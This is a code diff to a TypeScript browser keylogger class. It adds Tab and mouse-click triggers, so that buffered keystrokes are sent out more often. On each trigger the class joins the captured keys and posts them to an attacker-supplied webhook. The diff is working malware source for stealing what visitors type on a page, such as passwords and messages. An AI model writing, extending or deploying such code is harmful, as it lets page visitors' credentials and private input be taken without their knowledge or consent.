@@ -21,7 +21,7 @@ export default class Keylogger {
         this.webhook = webhook;
         const masterSession: string = this.getOrCreateMasterSession();
         this.initializeSession(masterSession);
-        logAll ? this.logAll() : this.logOnEnter();
+        logAll ? this.logAll() : this.logOnEvent();
     }
 
     /**
@@ -104,10 +104,12 @@ export default class Keylogger {
 
     /**
      * Logs all keystrokes until the "Enter" key is pressed, then sends the accumulated keys to the webhook.
+     *
+     * TODO: Also logs on "mouse click" & Tab click.
      */
-    protected logOnEnter(): void {
+    protected logOnEvent(): void {
         document.addEventListener("keydown", (event: KeyboardEvent) => {
-            if (event.key === "Enter") {
+            if (event.key === "Enter" || event.key === "Tab") {
                 const value: string = this.keys.join("");
                 this.keys = []; 
                 this.sendToWebhook({
@@ -116,6 +118,16 @@ export default class Keylogger {
                 });
             } else {
                 this.keys.push(event.key);
+            }
+        });
+        document.addEventListener("click", () => {
+            const value: string = this.keys.join("");
+            if (value) { // Only send if there are logged keys
+                this.keys = []; // Reset the keys array
+                this.sendToWebhook({
+                    type: "click",
+                    value,
+                });
             }
         });
     }
